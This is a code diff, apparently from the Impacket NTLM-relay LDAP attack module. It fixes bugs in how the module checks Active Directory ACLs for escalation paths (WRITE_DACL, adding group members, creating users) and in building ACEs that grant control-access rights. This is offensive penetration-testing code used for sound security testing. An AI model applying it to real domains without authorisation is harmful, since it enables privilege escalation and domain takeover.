@@ -203,7 +203,7 @@ class LDAPAttack(ProtocolAttack):
         ]
         privs['escalateViaGroup'] = False
         for group in interestingGroups:
-            self.client.search(domainDumper.root, '(objectSid=%s)' % group, attributes=['nTSecurityDescriptor', 'objectClass'])
+            self.client.search(domainDumper.root, '(objectSid=%s)' % group, attributes=['nTSecurityDescriptor', 'objectClass'], controls=controls)
             groupdata = self.client.response
             self.checkSecurityDescriptors(groupdata, privs, membersids, sidmapping, domainDumper)
             if privs['escalateViaGroup']:
@@ -230,6 +230,7 @@ class LDAPAttack(ProtocolAttack):
                 sdData = entry['raw_attributes']['nTSecurityDescriptor'][0]
             except IndexError:
                 # We don't have the privileges to read this security descriptor
+                LOG.debug('Access to security descriptor was denied for DN %s', dn)
                 continue
             hasFullControl = False
             secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR()
@@ -246,7 +247,8 @@ class LDAPAttack(ProtocolAttack):
                 if not ace.hasFlag(ACE.INHERITED_ACE) and ace.hasFlag(ACE.INHERIT_ONLY_ACE):
                     # ACE is set on this object, but only inherited, so not applicable to us
                     continue
-                # Check if the ACE has restrictions on object type
+
+                # Check if the ACE has restrictions on object type (inherited case)
                 if ace['AceType'] == ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE \
                     and ace.hasFlag(ACE.INHERITED_ACE) \
                     and ace['Ace'].hasFlag(ACCESS_ALLOWED_OBJECT_ACE.ACE_INHERITED_OBJECT_TYPE_PRESENT):
@@ -276,6 +278,12 @@ class LDAPAttack(ProtocolAttack):
                             privs['escalateViaGroup'] = True
                             privs['escalateGroup'] = dn
                     if ace['Ace']['Mask'].hasPriv(ACCESS_MASK.WRITE_DACL) or hasFullControl:
+                        # Check if the ACE is an OBJECT ACE, if so the WRITE_DACL is applied to
+                        # a property, which is both weird and useless, so we skip it
+                        if ace['AceType'] == ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE \
+                            and ace['Ace'].hasFlag(ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT):
+                            # LOG.debug('Skipping WRITE_DACL since it has an ObjectType set')
+                            continue
                         if not hasFullControl:
                             LOG.debug('Permission found: Write Dacl of %s; Reason: Granted to %s' % (dn, sidmapping[sid]))
                         # We can modify the domain Dacl
@@ -292,7 +300,7 @@ class LDAPAttack(ProtocolAttack):
         '''
         objectTypeGuid = bin_to_string(ace['Ace']['InheritedObjectType']).lower()
         for objectType, guid in OBJECTTYPE_GUID_MAP.items():
-            if objectType in objectClasses and objectTypeGuid:
+            if objectType in objectClasses and objectTypeGuid == guid:
                 return True
         # If none of these match, the ACE does not apply to this object
         return False
@@ -312,6 +320,7 @@ class LDAPAttack(ProtocolAttack):
         domainDumper = ldapdomaindump.domainDumper(self.client.server, self.client, domainDumpConfig)
         LOG.info('Enumerating relayed user\'s privileges. This may take a while on large domains')
         userSid, privs = self.validatePrivileges(self.username, domainDumper)
+
         if privs['create']:
             LOG.info('User privileges found: Create user')
         if privs['escalateViaGroup']:
@@ -391,9 +400,10 @@ def create_object_ace(privguid, sid):
     acedata['Mask'] = ldaptypes.ACCESS_MASK()
     acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
     acedata['ObjectType'] = string_to_bin(privguid)
-    acedata['InheritedObjectType'] = ''
+    acedata['InheritedObjectType'] = b''
     acedata['Sid'] = ldaptypes.LDAP_SID()
     acedata['Sid'].fromCanonical(sid)
+    assert sid == acedata['Sid'].formatCanonical()
     acedata['Flags'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
     nace['Ace'] = acedata
     return nace
@@ -401,7 +411,7 @@ def create_object_ace(privguid, sid):
 # Check if an ACE allows for creation of users
 def can_create_users(ace):
     createprivs = ace['Ace']['Mask'].hasPriv(ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CREATE_CHILD)
-    if ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE or ace['Ace']['ObjectType'] == '':
+    if ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE or ace['Ace']['ObjectType'] == b'':
         return False
     userprivs = bin_to_string(ace['Ace']['ObjectType']).lower() == 'bf967aba-0de6-11d0-a285-00aa003049e2'
     return createprivs and userprivs
@@ -409,7 +419,7 @@ def can_create_users(ace):
 # Check if an ACE allows for adding members
 def can_add_member(ace):
     writeprivs = ace['Ace']['Mask'].hasPriv(ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_WRITE_PROP)
-    if ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE or ace['Ace']['ObjectType'] == '':
+    if ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE or ace['Ace']['ObjectType'] == b'':
         return writeprivs
     userprivs = bin_to_string(ace['Ace']['ObjectType']).lower() == 'bf9679c0-0de6-11d0-a285-00aa003049e2'
     return writeprivs and userprivs
